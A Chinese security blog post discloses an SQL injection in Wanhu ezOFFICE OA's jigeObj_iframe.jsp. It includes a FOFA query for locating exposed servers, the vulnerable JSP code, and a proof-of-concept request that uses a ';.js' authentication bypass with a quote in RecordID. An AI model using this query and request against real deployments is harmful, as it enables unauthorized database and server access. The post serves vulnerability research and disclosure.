---
title: "万户OA jigeObj_iframe.jsp SQL注入漏洞"
source: https://mrxn.net/jswz/defaultroot-ezOFFICE-gov_documentmanager-jigeObj_iframe-sqli.html
asset_dir: assets/万户oa-jigeobj_iframe.jsp-sql注入漏洞
---

# 万户OA jigeObj\_iframe.jsp SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/7/30 15:25
* 846浏览
* [0评论](#comment)
* 12分钟阅读

深入探索

认证

授权

计算机安全


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

万户OA [ezoffice](https://mrxn.net/tag/ezoffice) 是万户网络协同办公产品多年来一直将主要精力致力于中高端市场的一款OA协同办公软件产品，统一的基础管理平台，实现用户数据统一管理、权限统一分配、身份统一认证。万户 ezOFFICE jigeObj\_iframe.jsp 接口存在[SQL注入](https://mrxn.net/tag/sql注入)漏洞，未授权的攻击者可利用此[漏洞](https://mrxn.net/tag/漏洞)获取数据库权限，深入利用可获取服务器权限。

# 影响版本

> 老旧版本

# fofa语法

> app="ezOFFICE协同管理平台" || app="万户ezOFFICE协同管理平台" || app="万户网络-ezOFFICE"

# 漏洞分析

直接看jigeObj\_iframe.jsp文件里的业务实现逻辑吧，非常简单明了

[![万户OA jigeObj_iframe.jsp SQL注入漏洞](images/img-001-25f0e00633f7.webp)](https://image.mrxn.net/8f1e8841286a46d180a9c271aceea8f3.webp)

```
String mRecordID=request.getParameter("RecordID");
String mTemplate=request.getParameter("Template");
//取得编号
if ( mRecordID==null||mRecordID.toString().equals("null")){
   mRecordID="";    //编号为空
}

//第一次， id 为空
if(mRecordID==null||mRecordID.equals("")||mRecordID.equals("null")){
isFirstIn="1";
}
//打开数据库
DBstep.iDBManager2000 DbaObj=new DBstep.iDBManager2000();
if ( DbaObj.OpenConnection())
{
  String mSql="Select * From Document Where RecordID='"+ mRecordID + "'";
  try
   {  
  if(!mRecordID.equals("")){
      result=DbaObj.ExecuteQuery(mSql);
```

深入探索

Docker加速服务

网页浏览器

Web安全书籍

参数`RecordID` 被直接拼接进SQL语句中然后用`ExecuteQuery`执行，所有参数都**没有过滤或校验**，从而造成[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

# 漏洞复现

权限绕过分析参考：[万户 ezOFFICE ajax\_checkUserNum.jsp SQL注入漏洞](https://mrxn.net/jswz/defaultroot-ezOFFICE-ajax_checkUserNum-sqli.html)

```
GET /defaultroot/modules/govoffice/gov_documentmanager/jigeObj_iframe.jsp;.js?RecordID=1'
Host: ezoffice.mrxn.net
```

其他万户OA 相关[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)  
[万户OA系列漏洞](https://mrxn.net/tag/ezoffice)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[万户OA jigeObj\_iframe.jsp SQL注入漏洞](https://mrxn.net/jswz/defaultroot-ezOFFICE-gov_documentmanager-jigeObj_iframe-sqli.html)  
文章链接：<https://mrxn.net/jswz/defaultroot-ezOFFICE-gov_documentmanager-jigeObj_iframe-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/defaultroot-ezOFFICE-gov\_documentmanager-jigeObj\_iframe-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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